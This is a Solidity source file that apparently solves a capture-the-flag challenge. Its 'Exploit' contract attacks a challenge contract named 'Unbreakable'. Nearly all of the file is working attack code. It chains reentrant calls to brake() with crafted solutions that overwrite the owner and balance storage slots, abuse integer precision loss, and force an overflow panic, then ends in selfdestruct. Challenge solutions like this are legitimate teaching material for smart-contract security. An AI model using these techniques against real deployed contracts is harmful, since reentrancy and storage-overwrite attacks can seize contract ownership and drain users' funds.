// SPDX-License-Identifier: MIT
pragma solidity 0.8.11;

import './Unbreakable.sol';

contract Exploit {

    Unbreakable instance;
    constructor(Unbreakable _instance)
    {
        instance = _instance;
        _instance.approve(address(_instance), type(uint).max);

        // read solutions from bottom to top
        Unbreakable.Solution memory solution_3 = Unbreakable.Solution({
            ch1_slot: 0,
            ch1_value: bytes32(0),
            ch2_amount: 0,                                           // fail the calculation challenge
            ch2_error: string(abi.encodeWithSignature("transferFrom(address,address,uint256)", address(this), instance, 1)),  // calling causes overflow panic error
            reward: bytes("")
        });

        Unbreakable.Solution memory solution_2 = Unbreakable.Solution({
            ch1_slot: uint256(keccak256(abi.encode(instance, 0))),  // overwrite contracts balance to pass final test before self-destruction
            ch1_value: bytes32(type(uint).max),
            ch2_amount: 1,                                          // integer precision loss passes check
            ch2_error: string("error"),
            reward: abi.encodeCall(instance.brake, solution_3)      // reentrancy
        });

        Unbreakable.Solution memory solution_1 = Unbreakable.Solution({
            ch1_slot: 5,                                            // overwrite owner
            ch1_value: bytes32(uint256(uint160(address(this)))),    // take care of byte alignment
            ch2_amount: 250000,                                     // just make sure token contract keeps *exactly* 80.0000% after precision loss in resupply
            ch2_error: string("error"),
            reward: abi.encodeCall(instance.brake, solution_2)      // reentrancy
        });

        instance.brake(solution_1);
    }
    
    function exploit() external {

        Unbreakable.Solution memory solution = Unbreakable.Solution({
            ch1_slot: 0,
            ch1_value: bytes32(0),
            ch2_amount: 0,                                           // fail the calculation challenge
            ch2_error: string(abi.encodeWithSignature("doStorageMaintenance()")),
            reward: bytes("")
        });

        instance.brake(solution);
    }

    fallback() external {
        selfdestruct(payable(0));       // you earned your point (:
    }
}